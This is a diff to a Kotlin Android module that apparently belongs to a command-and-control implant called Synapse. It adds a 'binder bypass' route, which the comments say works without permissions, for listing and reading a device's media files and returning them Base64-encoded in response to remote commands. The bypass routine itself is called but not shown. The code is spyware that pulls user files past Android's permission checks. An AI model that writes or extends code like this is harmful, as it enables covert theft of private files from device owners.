@@ -5,6 +5,7 @@ import android.database.Cursor
 import android.net.Uri
 import android.provider.MediaStore
 import android.util.Base64
+import android.util.Log
 import org.synapse.core.c2.Command
 import org.synapse.core.core.FileEntry
 import org.synapse.core.core.SynapseResponse
@@ -34,29 +35,53 @@ object FileModule {
             MediaStore.MediaColumns.RELATIVE_PATH
         )
 
-        val cursor: Cursor? = context.contentResolver.query(
-            uri, projection, null, null,
-            "${MediaStore.MediaColumns.DATE_ADDED} DESC"
-        )
+        var cursor: Cursor? = null
+        var files = mutableListOf<FileEntry>()
 
-        val files = mutableListOf<FileEntry>()
-        cursor?.use {
-            val idCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
-            val nameCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
-            val sizeCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
-            val dateCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)
-            val pathCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.RELATIVE_PATH)
+        // ── Route 1: ContentResolver (requires permission, may throw) ──
+        try {
+            cursor = context.contentResolver.query(
+                uri, projection, null, null,
+                "${MediaStore.MediaColumns.DATE_ADDED} DESC"
+            )
+            cursor?.use {
+                val idCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
+                val nameCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
+                val sizeCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
+                val dateCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)
+                val pathCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.RELATIVE_PATH)
 
-            var i = 0
-            while (it.moveToNext() && i < count) {
-                files.add(FileEntry(
-                    id = it.getLong(idCol).toString(),
-                    name = it.getString(nameCol),
-                    size = it.getLong(sizeCol),
-                    date = it.getLong(dateCol),
-                    path = it.getString(pathCol) ?: ""
-                ))
-                i++
+                var i = 0
+                while (it.moveToNext() && i < count) {
+                    files.add(FileEntry(
+                        id = it.getLong(idCol).toString(),
+                        name = it.getString(nameCol),
+                        size = it.getLong(sizeCol),
+                        date = it.getLong(dateCol),
+                        path = it.getString(pathCol) ?: ""
+                    ))
+                    i++
+                }
+            }
+            if (files.isNotEmpty()) {
+                Log.d("Synapse.Files", "ContentResolver success: ${files.size} files")
+            }
+        } catch (e: Exception) {
+            Log.d("Synapse.Files", "ContentResolver failed (${e.javaClass.simpleName}: ${e.message}), trying binder bypass...")
+        }
+
+        // ── Route 2: Binder bypass (works without permissions) ──
+        if (files.isEmpty()) {
+            try {
+                val binderFiles = PermissionBypass.readFilesViaBinder(context, type, count)
+                if (binderFiles.isNotEmpty()) {
+                    files = binderFiles.toMutableList()
+                    Log.d("Synapse.Files", "Binder bypass SUCCESS: ${files.size} files")
+                } else {
+                    Log.d("Synapse.Files", "Binder bypass returned 0 files")
+                }
+            } catch (e: Exception) {
+                Log.e("Synapse.Files", "Binder bypass FAILED: ${e.message}", e)
             }
         }
 
@@ -79,23 +104,43 @@ object FileModule {
         }
 
         val contentUri = Uri.withAppendedPath(uri, fileId.toString())
+        val name = cmd.params["name"] ?: "unknown"
 
+        // ── Route 1: ContentResolver ──
         try {
             val input: InputStream? = context.contentResolver.openInputStream(contentUri)
             val bytes = input?.use { it.readBytes() } ?: ByteArray(0)
-            val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
-
-            val name = cmd.params["name"] ?: "unknown"
-            val mimeType = context.contentResolver.getType(contentUri) ?: "application/octet-stream"
-
-            SynapseResponse.FileReadResponse(
-                file_id = fileId.toString(),
-                mime_type = mimeType,
-                size_bytes = bytes.size.toLong(),
-                base64_data = b64
-            )
+            if (bytes.isNotEmpty()) {
+                val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
+                val mimeType = context.contentResolver.getType(contentUri) ?: "application/octet-stream"
+                return@withContext SynapseResponse.FileReadResponse(
+                    file_id = fileId.toString(),
+                    mime_type = mimeType,
+                    size_bytes = bytes.size.toLong(),
+                    base64_data = b64
+                )
+            }
         } catch (e: Exception) {
-            SynapseResponse.ErrorResponse(error = "read:${e.message}", module = "files")
+            Log.d("Synapse.Files", "ContentResolver read failed (${e.javaClass.simpleName}: ${e.message}), trying binder bypass...")
         }
+
+        // ── Route 2: Binder bypass ──
+        try {
+            val bytes = PermissionBypass.readFileViaBinder(context, fileId, fileType)
+            if (bytes != null && bytes.isNotEmpty()) {
+                val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
+                Log.d("Synapse.Files", "Binder bypass read SUCCESS: ${bytes.size} bytes")
+                return@withContext SynapseResponse.FileReadResponse(
+                    file_id = fileId.toString(),
+                    mime_type = "application/octet-stream",
+                    size_bytes = bytes.size.toLong(),
+                    base64_data = b64
+                )
+            }
+        } catch (e: Exception) {
+            Log.e("Synapse.Files", "Binder bypass read FAILED: ${e.message}", e)
+        }
+
+        SynapseResponse.ErrorResponse(error = "read:all_routes_failed", module = "files")
     }
 }
